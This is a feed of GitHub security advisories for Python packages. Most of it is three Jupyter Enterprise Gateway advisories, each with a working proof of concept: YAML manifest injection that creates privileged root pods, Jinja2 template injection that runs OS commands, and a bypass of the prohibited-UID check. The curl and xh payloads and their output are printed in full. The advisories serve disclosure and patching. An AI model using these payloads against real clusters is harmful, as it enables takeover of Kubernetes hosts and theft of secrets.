<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-06-04T07:30:53.144Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[jupyter_enterprise_gateway] Jupyter Enterprise Gateway: Kubernetes Manifest Injection in Jinja2 Template Rendering]]></title>
        <id>https://github.com/advisories/GHSA-cfw7-6c5v-2wjq</id>
        <link href="https://github.com/advisories/GHSA-cfw7-6c5v-2wjq"/>
        <updated>2026-06-03T21:37:18.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The environment variables used during the rendering of the Kubernetes manifest allow YAML injection, enabling attackers to overwrite existing keys like <code>securityContext</code> and inject multi-document YAML to create additional unintended Kubernetes resources.</p>
<h3 id="details">Details</h3>
<p>The server interpolates untrusted environment variables (e.g., <code>KERNEL_XXX</code>) into Kubernetes manifests without YAML-aware escaping, enabling YAML injection attacks. Attackers can inject new fields, overwrite critical fields (e.g., duplicate <code>securityContext</code> keys, where the last one prevails), and inject document boundaries (<code>---</code> for new documents, <code>...</code> for end-of-document) to generate multiple resources, potentially creating arbitrary kinds like privileged pods.</p>
<p>The Jinja2 template for the Kubernetes manifest contains several <code>kernel_xxx</code> variables, such as <code>kernel_working_dir</code> that are used when rendering the manifest and are all vectors for YAML injection.
<a href="https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/etc/kernel-launchers/kubernetes/scripts/kernel-pod.yaml.j2#L77">https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/etc/kernel-launchers/kubernetes/scripts/kernel-pod.yaml.j2#L77</a></p>
<p>These values come from the environment passed in the API call, where they were <code>KERNEL_XXX</code> before being converted to lowercase.</p>
<p><a href="https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/etc/kernel-launchers/kubernetes/scripts/launch_kubernetes.py#L130-L137">https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/etc/kernel-launchers/kubernetes/scripts/launch_kubernetes.py#L130-L137</a></p>
<h3 id="poc">PoC</h3>
<p>These proof of concepts are injecting in the <code>KERNEL_WORKING_DIR</code> env var, but any of the env vars could have been used.
By default, the <code>KERNEL_WORKING_DIR</code> will be ignored unless <code>EG_MIRROR_WORKING_DIRS</code> is truthy for the <code>enterprise-gateway</code>. This is controlled by the <code>mirrorWorkingDirs</code> value in the Helm chart.</p>
<p>Using <code>ducaale/xh</code>:</p>
<pre><code class="language-bash">xh http://localhost:31529/api/kernels env:=@env-working-dir-exploit.yaml
</code></pre>
<p><code>env-working-dir-exploit.yaml</code>:</p>
<pre><code class="language-json">{
  "KERNEL_POD_NAME": "working-dir-root",
  "KERNEL_NAMESPACE": "notebooks",
  "KERNEL_WORKING_DIR": "\"/tmp\\\"\\n\\n# INJECTION\\n  securityContext:\\n    runAsUser: 0\\n    runAsGroup: 0\\n    fsGroup: 100\\n# HAHA - stray quote \""
}
</code></pre>
<p>Resulting request:</p>
<pre><code>POST /api/kernels HTTP/1.1
Accept: application/json, */*;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Content-Length: 233
Content-Type: application/json
Host: localhost:31529
User-Agent: xh/0.24.0

{
    "env": {
        "KERNEL_POD_NAME": "working-dir-root",
        "KERNEL_NAMESPACE": "notebooks",
        "KERNEL_WORKING_DIR": "\"/tmp\\\"\\n\\n# INJECTION\\n  securityContext:\\n    runAsUser: 0\\n    runAsGroup: 0\\n    fsGroup: 100\\n# HAHA - stray quote \""
    }
}
</code></pre>
<p>Curl equivalent command:</p>
<pre><code class="language-bash">curl http://localhost:31529/api/kernels -H 'content-type: application/json' -H 'accept: application/json, */*;q=0.5' -d '{"env":{"KERNEL_POD_NAME":"working-dir-root","KERNEL_NAMESPACE":"notebooks","KERNEL_WORKING_DIR":"\"/tmp\\\"\\n\\n# INJECTION\\n  securityContext:\\n    runAsUser: 0\\n    runAsGroup: 0\\n    fsGroup: 100\\n# HAHA - stray quote \""}}'
</code></pre>
<p>The rendered Jinja2 template:</p>
<pre><code class="language-yaml"># This file defines the Kubernetes objects necessary for kernels to run witihin Kubernetes.
# Substitution parameters are processed by the launch_kubernetes.py code located in the
# same directory.  Some values are factory values, while others (typically prefixed with 'kernel_') can be
# provided by the client.
#
# This file can be customized as needed.  No changes are required to launch_kubernetes.py provided kernel_
# values are used - which be automatically set from corresponding KERNEL_ env values.  Updates will be required
# to launch_kubernetes.py if new document sections (i.e., new k8s 'kind' objects) are introduced.
#
apiVersion: v1
kind: Pod
metadata:
  name: "working-dir-root"
  namespace: "notebooks"
  labels:
    kernel_id: "186f4ecf-bf90-40b8-b210-a0987bfce927"
    app: enterprise-gateway
    component: kernel
    source: kernel-pod.yaml
  annotations:
    cluster-autoscaler.kubernetes.io/safe-to-evict: "false"
spec:
  restartPolicy: Never
  serviceAccountName: "default"
# NOTE: that using runAsGroup requires that feature-gate RunAsGroup be enabled.
# WARNING: Only using runAsUser w/o runAsGroup or NOT enabling the RunAsGroup feature-gate
# will result in the new kernel pod's effective group of 0 (root)! although the user will
# correspond to the runAsUser value.  As a result, BOTH should be uncommented AND the feature-gate
# should be enabled to ensure expected behavior.  In addition, 'fsGroup: 100' is recommended so
# that /home/jovyan can be written to via the 'users' group (gid: 100) irrespective of the
# "kernel_uid" and "kernel_gid" values.
  securityContext:
    runAsUser: 1000
    runAsGroup: 100
    fsGroup: 100
  containers:
  - image: "elyra/kernel-py:3.2.3"
    name: "working-dir-root"
    env:
# Add any custom envs here that aren't already configured for the kernel's environment
#    - name: MY_CUSTOM_ENV
#      value: "my_custom_value"
    workingDir: "/tmp"

# INJECTION
  securityContext:
    runAsUser: 0
    runAsGroup: 0
    fsGroup: 100
# HAHA - stray quote "
    volumeMounts:
# Define any "unconditional" mounts here, followed by "conditional" mounts that vary per client
  volumes:
# Define any "unconditional" volumes here, followed by "conditional" volumes that vary per client
</code></pre>
<p>Normally the container would run as <code>uid=1000(jovyan) gid=100(users) groups=100(users)</code>.
This injects a pod <code>securityContext</code> with <code>runAsUser: 0</code> and <code>runAsGroup: 0</code> (and <code>fsGroup: 100</code>).
The processing of the YAML results in the duplicate key clobbering the original.
Making the container run as <code>uid=0(root) gid=0(root) groups=0(root),100(users)</code>.</p>
<p>In addition to injecting a pod level <code>securityContext</code> it is also possible to inject a container level <code>securityContext</code> which supports the <code>privileged</code> field.</p>
<h4 id="injecting-a-pod">Injecting a Pod</h4>
<p>By injecting <code>...</code> and <code>---</code> it is possible to use multi-document YAML to inject Kubernetes resources.</p>
<pre><code class="language-bash">xh http://localhost:31529/api/kernels env:=@env-working-dir-exploit-pod.yaml
</code></pre>
<p><code>env-working-dir-exploit-pod.yaml</code>:</p>
<pre><code class="language-json">{
  "KERNEL_POD_NAME": "working-dir-root-pod",
  "KERNEL_NAMESPACE": "notebooks",
  "KERNEL_WORKING_DIR": "\"/tmp\\\"\\n\\n# INJECTION\\n...\\n---\\napiVersion: v1\\nkind: Pod\\nmetadata:\\n  name: injected-pod\\n\\\n  spec:\\n  containers:\\n    - name: injected-container\\n      image: nginx\\n      ports:\\n        - containerPort: 80\\n      securityContext:\\n        privileged: true\\n        runAsUser: 0\\n        runAsGroup: 0\\n...\\n# HAHA - stray quote\""
}
</code></pre>
<p>This is rendered as (skipping the beginning of the rendering before the inject):</p>
<pre><code class="language-yaml">    workingDir: "/tmp"

# INJECTION
...
---
apiVersion: v1
kind: Pod
metadata:
  name: injected-pod
spec:
  containers:
    - name: injected-container
      image: nginx
      ports:
        - containerPort: 80
      securityContext:
        privileged: true
        runAsUser: 0
        runAsGroup: 0
...
# HAHA - stray quote"
    volumeMounts:
# Define any "unconditional" mounts here, followed by "conditional" mounts that vary per client
  volumes:
# Define any "unconditional" volumes here, followed by "conditional" volumes that vary per client
</code></pre>
<p><code>kubectl get pods -n notebooks</code></p>
<pre><code>NAME                   READY   STATUS    RESTARTS   AGE
injected-pod           1/1     Running   0          4s
working-dir-root-pod   1/1     Running   0          4s
</code></pre>
<p>The <code>injected-pod</code> has been created in addition to the <code>working-dir-root-pod</code>.</p>
<p><code>kubectl get pod/injected-pod -o yaml -n notebooks -o jsonpath='{.spec.containers[*].securityContext}'</code>:</p>
<pre><code class="language-json">{
  "privileged": true,
  "runAsGroup": 0,
  "runAsUser": 0
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>An attacker can create pods running with arbitrary, <code>image</code>, <code>securityContext</code>, and <code>volumeMounts</code> including <code>hostPath</code> mounts. Privileged pods can be created.</p>
<p>Arbitrary Kubernetes resources of kinds: <code>Pod</code>, <code>Secret</code>, <code>PersistentVolumeClaim</code>, <code>PersistentVolume</code>, <code>Service</code>, and <code>ConfigMap</code> can be created.</p>
<p>Repeated exploitation can compromise all worker nodes, and thus the entire Kubernetes cluster. Multiple container escape vectors exist. It is possible to create privileged pods which could load kernel modules to compromise the host. It is also possible to specify volume mounts, so another vector for a container escape is to use a <code>hostPath</code> R/W volume mount, use the injected <code>securityContext</code> to run as <code>root</code>, and then gain code execution in the underlying worker node by creating a crontab entry in the mounted host file system.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jupyter-server/enterprise_gateway/security/advisories/GHSA-cfw7-6c5v-2wjq">https://github.com/jupyter-server/enterprise_gateway/security/advisories/GHSA-cfw7-6c5v-2wjq</a></li>
<li><a href="https://github.com/advisories/GHSA-cfw7-6c5v-2wjq">https://github.com/advisories/GHSA-cfw7-6c5v-2wjq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cfw7-6c5v-2wjq</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-03T21:37:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jupyter_enterprise_gateway] Jupyter Enterprise Gateway: Jinja2 Template Server Side Template Injection resulting in Remote Code Execution]]></title>
        <id>https://github.com/advisories/GHSA-f49j-v924-fx9w</id>
        <link href="https://github.com/advisories/GHSA-f49j-v924-fx9w"/>
        <updated>2026-06-03T21:36:08.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The environment variables (<code>KERNEL_XXX</code>) used during the rendering of the Kubernetes manifest are vulnerable to Server Side Template Injection (SSTI).
By including Jinja2 template expressions it is possible to execution Python code and OS Commands in the Enterprise Gateway service.
The code can use or steal the Kubernetes service account token, which can steal Kubernetes secrets and be used to fully compromise the Kubernetes cluster by scheduling a privileged pod or a pod with a <code>hostPath</code> volume mount.</p>
<h3 id="details">Details</h3>
<p>The <code>KERNEL_POD_NAME</code> variable is rendered using Jinja2, allowing for code execution via template expression statements, in this code:
<a href="https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/enterprise_gateway/services/processproxies/k8s.py#L219-L247">https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/enterprise_gateway/services/processproxies/k8s.py#L219-L247</a></p>
<p>The Jinja2 template for the Kubernetes manifest contains several <code>kernel_xxx</code> variables, in addition to <code>kernel_pod_name</code> discussed above, such as <code>kernel_working_dir</code> that are used when rendering the manifest and are all vectors for SSTI.
<a href="https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/etc/kernel-launchers/kubernetes/scripts/kernel-pod.yaml.j2#L77">https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/etc/kernel-launchers/kubernetes/scripts/kernel-pod.yaml.j2#L77</a></p>
<p>These values come from the environment passed in the API call, where they were <code>KERNEL_XXX</code> before being converted to lowercase.</p>
<p><a href="https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/etc/kernel-launchers/kubernetes/scripts/launch_kubernetes.py#L130-L137">https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/etc/kernel-launchers/kubernetes/scripts/launch_kubernetes.py#L130-L137</a></p>
<h3 id="poc">PoC</h3>
<h4 id="simple-demonstration-of-ssti-using-7--7">Simple demonstration of SSTI using <code>{{7 * 7}}</code></h4>
<pre><code class="language-bash">curl http://enterprise-gateway.bdawg.svc.cluster.local:8888/api/kernels --data '{"name":"python_kubernetes", "env": {"KERNEL_POD_NAME": "bdawg-{{7 * 7}}" }}'
</code></pre>
<pre><code class="language-json">{"id": "1094076f-35c6-48a5-ae60-0c943bb97a9a", "name": "python_kubernetes", "last_activity": "2025-07-17T07:14:42.155736Z", "execution_state": "starting", "connections": 0}
</code></pre>
<p>Running <code>kubectl get pods</code></p>
<pre><code>NAME                                                 READY   STATUS    RESTARTS   AGE
bdawg-49                                             1/1     Running   0          3m54s
</code></pre>
<h4 id="remote-code-execution---os-commands-via-ssti">Remote code execution - OS Commands via SSTI</h4>
<pre><code class="language-bash">curl http://enterprise-gateway.notebooks.svc.cluster.local:8888/api/kernels --data '{"name":"python_kubernetes", "env": {"KERNEL_POD_NAME": "bdawg-{{ cycler.__init__.__globals__.os.popen(\"hostname\").read() }}", "KERNEL_NAMESPACE": "notebooks" }}'
</code></pre>
<pre><code class="language-json">{"id": "85ec9431-d005-48d5-8127-5f022f2c5780", "name": "python_kubernetes", "last_activity": "2025-07-17T07
</code></pre>
<pre><code>NAME                                                 READY   STATUS    RESTARTS   AGE
bdawg-enterprise-gateway-8695685bc8-klm4m            1/1     Running   0          2m25s
</code></pre>
<p><code>enterprise-gateway-8695685bc8-klm4m</code> is the hostname of the Enterprise Gateway pod.</p>
<h4 id="enterprise-gateway-rbac">Enterprise Gateway RBAC</h4>
<p>The Enterprise Gateway service account has R/W access to several resource kinds.</p>
<p>Stolen Enterprise Gateway service account <code>kubectl auth can-i --list</code></p>
<pre><code>Resources                                                Non-Resource URLs                      Resource Names   Verbs
selfsubjectreviews.authentication.k8s.io                 []                                     []               [create]
selfsubjectaccessreviews.authorization.k8s.io            []                                     []               [create]
selfsubjectrulesreviews.authorization.k8s.io             []                                     []               [create]
rolebindings.rbac.authorization.k8s.io                   []                                     []               [get list create delete]
configmaps                                               []                                     []               [get watch list create delete]
namespaces                                               []                                     []               [get watch list create delete]
persistentvolumeclaims                                   []                                     []               [get watch list create delete]
persistentvolumes                                        []                                     []               [get watch list create delete]
pods                                                     []                                     []               [get watch list create delete]
secrets                                                  []                                     []               [get watch list create delete]
services                                                 []                                     []               [get watch list create delete]
scheduledsparkapplications.sparkoperator.k8s.io/status   []                                     []               [get watch list create delete]
scheduledsparkapplications.sparkoperator.k8s.io          []                                     []               [get watch list create delete]
sparkapplications.sparkoperator.k8s.io/status            []                                     []               [get watch list create delete]
sparkapplications.sparkoperator.k8s.io                   []                                     []               [get watch list create delete]
                                                         [/.well-known/openid-configuration/]   []               [get]
                                                         [/.well-known/openid-configuration]    []               [get]
                                                         [/api/*]                               []               [get]
                                                         [/api]                                 []               [get]
                                                         [/apis/*]                              []               [get]
                                                         [/apis]                                []               [get]
                                                         [/healthz]                             []               [get]
                                                         [/healthz]                             []               [get]
                                                         [/livez]                               []               [get]
                                                         [/livez]                               []               [get]
                                                         [/openapi/*]                           []               [get]
                                                         [/openapi]                             []               [get]
                                                         [/openid/v1/jwks/]                     []               [get]
                                                         [/openid/v1/jwks]                      []               [get]
                                                         [/readyz]                              []               [get]
                                                         [/readyz]                              []               [get]
                                                         [/version/]                            []               [get]
                                                         [/version/]                            []               [get]
                                                         [/version]                             []               [get]
                                                         [/version]                             []               [get]
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is a server side template injection that leads to remote code execution (python and OS commands).</p>
<p>An attacker can get remote code execution in the Enterprise Gateway pod and steal its Kubernetes service account's token.
It can use the privileges to spy on and interfere with other Jupyter kernel, read, write, or delete configuration maps, read secrets, access persistent storage, privileged pods, or create pods with <code>hostPath</code> mounts, which can be used to compromise the complete cluster and all workloads on it.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jupyter-server/enterprise_gateway/security/advisories/GHSA-f49j-v924-fx9w">https://github.com/jupyter-server/enterprise_gateway/security/advisories/GHSA-f49j-v924-fx9w</a></li>
<li><a href="https://github.com/advisories/GHSA-f49j-v924-fx9w">https://github.com/advisories/GHSA-f49j-v924-fx9w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f49j-v924-fx9w</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-03T21:36:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[aiohttp] AIOHTTP is vulnerable to cross-origin redirect with per-request cookies]]></title>
        <id>https://github.com/advisories/GHSA-hg6j-4rv6-33pg</id>
        <link href="https://github.com/advisories/GHSA-hg6j-4rv6-33pg"/>
        <updated>2026-06-03T21:34:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Cookies set with the <code>cookies</code> parameter on requests are sent after following a cross-origin redirect.</p>
<h3 id="impact">Impact</h3>
<p>If a developer uses the <code>cookies</code> parameter on a per-request basis then sensitive data might be leaked to an attacker if they manage to control a redirect.</p>
<h3 id="workaround">Workaround</h3>
<p>If unable to upgrade, using a <code>Cookie</code> header in the <code>headers</code> parameter is not vulnerable.</p>
<hr>
<p>Patch: <a href="https://github.com/aio-libs/aiohttp/commit/f54c40851b0d6c4bbdab97ba518a223adda32478">https://github.com/aio-libs/aiohttp/commit/f54c40851b0d6c4bbdab97ba518a223adda32478</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/aio-libs/aiohttp/security/advisories/GHSA-hg6j-4rv6-33pg">https://github.com/aio-libs/aiohttp/security/advisories/GHSA-hg6j-4rv6-33pg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-47265">https://nvd.nist.gov/vuln/detail/CVE-2026-47265</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/commit/f54c40851b0d6c4bbdab97ba518a223adda32478">https://github.com/aio-libs/aiohttp/commit/f54c40851b0d6c4bbdab97ba518a223adda32478</a></li>
<li><a href="https://github.com/advisories/GHSA-hg6j-4rv6-33pg">https://github.com/advisories/GHSA-hg6j-4rv6-33pg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hg6j-4rv6-33pg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-03T21:34:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jupyter_enterprise_gateway] Jupyter Enterprise Gateway: ContainerProcessProxy._enforce_prohibited_ids Bypass]]></title>
        <id>https://github.com/advisories/GHSA-chq7-94j8-cj28</id>
        <link href="https://github.com/advisories/GHSA-chq7-94j8-cj28"/>
        <updated>2026-06-03T21:30:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Jupyter Enterprise Gateway has a prohibited UID and GID feature that by default prevents launching kernels with UID or GID 0 (root).
This can be bypassed. It is possible to launch kernels with a prohibited UID and/or GID by using a specially crafted <code>KERNEL_UID</code> or <code>KERNEL_GID</code> value.</p>
<p>The feature is described in the documentation: </p>
<p><a href="https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/docs/source/operators/config-add-env.md?plain=1#L103-L107">https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/docs/source/operators/config-add-env.md?plain=1#L103-L107</a></p>
<p><a href="https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/docs/source/operators/config-add-env.md?plain=1#L88-L92">https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/docs/source/operators/config-add-env.md?plain=1#L88-L92</a></p>
<p><a href="https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/docs/source/operators/deploy-kubernetes.md?plain=1#L769">https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/docs/source/operators/deploy-kubernetes.md?plain=1#L769</a></p>
<h3 id="details">Details</h3>
<p>The <code>prohibited_uids</code> and <code>prohibited_uids</code> are set based of the OS env var <code>EG_PROHIBITED_UIDS</code> and <code>EG_PROHIBITED_GIDS</code>, and default to the string <code>0</code>.</p>
<p><a href="https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/enterprise_gateway/services/processproxies/container.py#L29-L30">https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/enterprise_gateway/services/processproxies/container.py#L29-L30</a></p>
<p>The checks <a href="https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/enterprise_gateway/services/processproxies/container.py#L113">https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/enterprise_gateway/services/processproxies/container.py#L113</a> and <a href="https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/enterprise_gateway/services/processproxies/container.py#L119">https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/enterprise_gateway/services/processproxies/container.py#L119</a> look for the user supplied <code>KERNEL_UID</code> / <code>KERNEL_GID</code> string in the <code>prohibited_uids</code> / <code>prohibited_gids</code> strings. These checks can be bypassed by including whitespace, for example the string <code>0 </code> (trailing space).</p>
<p>The user supplied string is used in the Kubernetes manifest at <a href="https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/etc/kernel-launchers/kubernetes/scripts/kernel-pod.yaml.j2#L35">https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/etc/kernel-launchers/kubernetes/scripts/kernel-pod.yaml.j2#L35</a> and <a href="https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/etc/kernel-launchers/kubernetes/scripts/kernel-pod.yaml.j2#L38">https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/etc/kernel-launchers/kubernetes/scripts/kernel-pod.yaml.j2#L38</a> where they are parsed as an integer in the Jinja2 template - which will ignore the whitespace.</p>
<h3 id="poc">PoC</h3>
<h4 id="how-it-is-meant-to-work">How it is meant to work</h4>
<p>Trying <code>0</code> gets denied, as expected.</p>
<pre><code class="language-bash">xh http://enterprise-gateway.bdawg.svc.cluster.local:8888/api/kernels name=python_kubernetes env:='{"KERNEL_POD_NAME":"bdawg", "KERNEL_UID": "0", "KERNEL_GID": "0"}'
</code></pre>
<pre><code>HTTP/1.1 403 Kernel's UID value of '0' has been denied via EG_PROHIBITED_UIDS!
Content-Length: 94
Content-Type: application/json
Date: Mon, 14 Jul 2025 12:57:09 GMT
Server: TornadoServer/6.4.1
X-Content-Type-Options: nosniff
</code></pre>
<pre><code class="language-json">{
    "reason": "Kernel's UID value of '0' has been denied via EG_PROHIBITED_UIDS!",
    "message": ""
}
</code></pre>
<h4 id="exploit-bypassing-the-checks">Exploit bypassing the checks</h4>
<p>Using <code>0 </code> with a trailing space, bypasses the check.</p>
<pre><code class="language-bash">xh http://enterprise-gateway.bdawg.svc.cluster.local:8888/api/kernels name=python_kubernetes env:='{"KERNEL_POD_NAME":"bdawg", "KERNEL_UID": "0 ", "KERNEL_GID": "0 "}'
</code></pre>
<pre><code>HTTP/1.1 201 Created
Content-Length: 172
Content-Type: application/json
Date: Mon, 14 Jul 2025 14:15:19 GMT
Location: /api/kernels/17eee032-994f-4dd2-8ade-87169c300a40
Server: TornadoServer/6.4.1
X-Content-Type-Options: nosniff
</code></pre>
<pre><code>{
    "id": "17eee032-994f-4dd2-8ade-87169c300a40",
    "name": "python_kubernetes",
    "last_activity": "2025-07-14T14:15:21.468155Z",
    "execution_state": "starting",
    "connections": 0
}
</code></pre>
<p>The pod is successfully scheduled.</p>
<p>Inspecting the container we can see it is running as <code>root</code>:</p>
<pre><code class="language-bash">kubectl exec -it pod/bdawg -- bash
</code></pre>
<pre><code>(base) root@bdawg3:~# id
uid=0(root) gid=0(root) groups=0(root),100(users)
</code></pre>
<p>If we had not supplied the <code>KERNEL_UID</code> / <code>KERNEL_GID</code> the container would have been running as UID:GID <code>1000:100</code> (<code>jovyan:users</code>).</p>
<h3 id="impact">Impact</h3>
<p>This input validation vulnerability allows running Jupyter kernels as root, which can be dangerous as it allows more attack surface, and may lead to container escapes, compromising the worker node and all workloads running on it. Repeated exploitation can compromise all worker nodes, and thus the entire Kubernetes cluster. It is possible to specify volume mounts, so one vector for a container escape is to use a <code>hostPath</code> R/W volume mount, use this UID/GID bypass to run as root, and then gain code execution in the underlying worker node by creating a crontab entry in the mounted host file system.</p>
<p>Organisations running Jupyter Enterprise Gateway to host Jupyter Kernels on at least Kubernetes clusters (I've tested this), and possibly on any other supported container orchestration systems or systems that utilise the <code>KERNEL_UID</code> and <code>KERNEL_GID</code> variables with the <code>EG_PROHIBITED_UIDS</code> and <code>EG_PROHIBITED_GIDS</code> feature.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jupyter-server/enterprise_gateway/security/advisories/GHSA-chq7-94j8-cj28">https://github.com/jupyter-server/enterprise_gateway/security/advisories/GHSA-chq7-94j8-cj28</a></li>
<li><a href="https://github.com/jupyter-server/enterprise_gateway/releases/tag/v3.3.0">https://github.com/jupyter-server/enterprise_gateway/releases/tag/v3.3.0</a></li>
<li><a href="https://github.com/advisories/GHSA-chq7-94j8-cj28">https://github.com/advisories/GHSA-chq7-94j8-cj28</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-chq7-94j8-cj28</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-03T21:30:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[docling-core] Docling Core: Unsafe remote filename resolution]]></title>
        <id>https://github.com/advisories/GHSA-jmmv-h3mp-59v8</id>
        <link href="https://github.com/advisories/GHSA-jmmv-h3mp-59v8"/>
        <updated>2026-06-03T21:16:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>In versions <code>&gt;= 1.5.0, &lt; 2.74.1</code>, <code>docling-core</code> did not sufficiently restrict remote request destinations and could resolve a server-provided <code>Content-Disposition</code> to a local path in an unsafe manner.</p>
<p>In applications that accept untrusted URLs, this could allow SSRF attacks targeting local files outside the user-defined cache directory.</p>
<h3 id="patches">Patches</h3>
<p>Patched in <code>docling-core</code> <code>2.74.1</code>.
The fix adds stricter validation for remote destinations and normalizes server-provided filenames before use.</p>
<p>Users should upgrade to:</p>
<ul>
<li><code>docling-core</code> <code>&gt;= 2.74.1</code></li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading is not immediately possible, avoid passing untrusted URLs into remote fetch functionality.</p>
<h3 id="references">References</h3>
<ul>
<li>Fix release: <a href="https://github.com/docling-project/docling-core/releases/tag/v2.74.1"><code>v2.74.1</code></a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/docling-project/docling-core/security/advisories/GHSA-jmmv-h3mp-59v8">https://github.com/docling-project/docling-core/security/advisories/GHSA-jmmv-h3mp-59v8</a></li>
<li><a href="https://github.com/docling-project/docling-core/releases/tag/v2.74.1">https://github.com/docling-project/docling-core/releases/tag/v2.74.1</a></li>
<li><a href="https://github.com/advisories/GHSA-jmmv-h3mp-59v8">https://github.com/advisories/GHSA-jmmv-h3mp-59v8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jmmv-h3mp-59v8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-03T21:16:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[docling-core] Docling Core: Insufficient validation of image reference URIs]]></title>
        <id>https://github.com/advisories/GHSA-j5xp-7m2f-49jv</id>
        <link href="https://github.com/advisories/GHSA-j5xp-7m2f-49jv"/>
        <updated>2026-06-03T21:15:33.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>In versions <code>&gt;= 2.5.0, &lt; 2.74.1</code>, <code>docling-core</code>  could allow local <code>file://</code> image references and accepted inline <code>data:</code> content without a decoded-size limit.</p>
<p>In applications that accept untrusted image references, this may allow access to local files readable by the process or excessive memory use from large inline payloads.</p>
<h3 id="patches">Patches</h3>
<p>Patched in <code>docling-core</code> <code>2.74.1</code>.
The fix blocks local file URIs by default and adds a size limit for decoded inline image data.</p>
<p>Users should upgrade to:</p>
<ul>
<li><code>docling-core</code> <code>&gt;= 2.74.1</code></li>
